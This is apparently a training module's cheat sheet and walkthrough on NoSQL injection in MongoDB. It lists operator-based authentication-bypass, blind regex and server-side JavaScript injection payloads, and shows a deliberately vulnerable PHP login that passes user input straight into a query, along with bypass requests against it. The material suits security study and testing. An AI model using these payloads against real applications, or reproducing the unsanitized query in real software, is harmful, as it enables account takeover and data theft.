MongoDB Usage
```

Alternative Queries
name: {$ne: 'doesntExist'}: Assuming doesntExist doesn't match any documents' names, this will match all documents.
name: {$gt: ''}: This matches all documents whose name is 'bigger' than an empty string.
name: {$gte: ''}: This matches all documents whose name is 'bigger or equal to' an empty string.
name: {$lt: '~'}: This compares the first character of name to a Tilda character and matches if it is 'less'. This will not always work, but it works in this case because Tilda is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters.
name: {$lte: '~'}: Same logic as above, except it additionally matches documents whose names start with ~.

```
Connect to MongoDB: mongosh mongodb://127.0.0.1:27017

List databases: show databases

List collections: show collections

Insert data: db.collection.insertOne({...})

Insert lots of data: db.apples.insertMany([{...},{...},...])

Selecting data: db.collection.find({...})

Selecting one piece of data: db.collection.findOne({...})

Update (one) document: db.collection.updateOne({...}, {...})

Update multiple documents: db.collection.updateMany({...}, {...})

Delete document(s): db.apples.remove({...})
```
Query Operators
Type	Operator	Description	Example
Comparison	$eq	Matches values which are equal to a specified value	type: {$eq: "Pink Lady"}
Comparison	$gt	Matches values which are greater than a specified value	price: {$gt: 0.30}
Comparison	$gte	Matches values which are greater than or equal to a specified value	price: {$gte: 0.50}
Comparison	$in	Matches values which exist in the specified array	type: {$in: ["Granny Smith", "Pink Lady"]}
Comparison	$lt	Matches values which are less than a specified value	price: {$lt: 0.60}
Comparison	$lte	Matches values which are less than or equal to a specified value	price: {$lte: 0.75}
Comparison	$nin	Matches values which are not in the specified array	type: {$nin: ["Golden Delicious", "Granny Smith"]}
Logical	$and	Matches documents which meet the conditions of both specified queries	$and: [{type: 'Granny Smith'}, {price: 0.65}]
Logical	$not	Matches documents which do not meet the conditions of a specified query	type: {$not: {$eq: "Granny Smith"}}
Logical	$nor	Matches documents which do not meet the conditions of any of the specified queries	$nor: [{type: 'Granny Smith'}, {price: 0.79}]
Logical	$or	Matches documents which meet the conditions of one of the specified queries	$or: [{type: 'Granny Smith'}, {price: 0.79}]
Evaluation	$mod	Matches values which divided by a specific divisor have the specified remainder	price: {$mod: [4, 0]}
Evaluation	$regex	Matches values which match a specified RegEx	type: {$regex: /^G.*/}
Evaluation	$where	Matches documents which satisfy a JavaScript expression	$where: 'this.type.length === 9'
Authentication Bypass / Data Exfiltration Payloads:
URL-Encoded
param[$ne]=x
param[$gt]=
param[$gte]=
param[$lt]=~
param[$lte]=~
param[$regex]=.*
```

JSON
```
{param: {$ne: 'x'}}
{param: {$gt: ''}}
{param: {$gte: ''}}
{param: {$lt: '~'}}
{param: {$lte: '~'}}
{param: {$regex: '.*'}}
{param: {$nin: []}}
Blind NoSQLi Payloads:
URL-Encoded
param[$regex]=^XYZ.*$
JSON
{param: {$regex: '^XYZ.*$}}
Server-Side JavaScript Injection Payloads:
' || true || ''=='
" || true || ""=="
```
This cheat sheet contains a (non-comprehensive) list of payloads you may use when testing an application for NoSQL injection vulnerabilities. The most important qualities for finding vulnerabilities are creativity and the ability to adapt, so it is possible that these payloads will not work in your specific scenario, but something else does.

Some other resources you may want to refer to may be:

```
```
Code: php
...
if ($_SERVER['REQUEST_METHOD'] === "POST"):
    if (!isset($_POST['email'])) die("Missing `email` parameter");
    if (!isset($_POST['password'])) die("Missing `password` parameter");
    if (empty($_POST['email'])) die("`email` can not be empty");
    if (empty($_POST['password'])) die("`password` can not be empty");

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
    $cursor = $manager->executeQuery('mangomail.users', $query);
        
    if (count($cursor->toArray()) > 0) {
        ...
We can see that the server checks if email and password are both given and non-empty before doing anything with them. Once that is verified, it connects to a MongoDB instance running locally and then queries mangomail to see if there is a user with the given pair of email and password, like so:
```
Code: javascript
db.users.find({
    email: "<email>",
    password: "<password>"
});
```
The problem is that both email and username are user-controlled inputs, which are passed unsanitized into a MongoDB query. This means we (as attackers) can take control of the query.

Many query operators were introduced in the first section of this module, and you may already have an idea of how to manipulate this query. For now, we want this query to return a match on any document because this will result in us being authenticated as whoever it matched. A straightforward way to do this would be to use the $ne query operator on both email and password to match values that are not equal to something we know doesn't exist. To put it in words, we want a query that matches email is not equal to 'test@test.com', and the password is not equal to 'test'.

Code: javascript
```
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```
Some other payloads that would work are:
```
email=admin%40mangomail.com&password[$ne]=x: This assumes we know the admin's email and we wanted to target them directly
email[$gt]=&password[$gt]=: Any string is 'greater than' an empty string
email[$gte]=&password[$gte]=: Same logic as above
```

PayloadAllTheThings - NoSQL Injection
HackTricks - NoSQL Injection
NullSweep - NoSQL Injection Cheatsheet
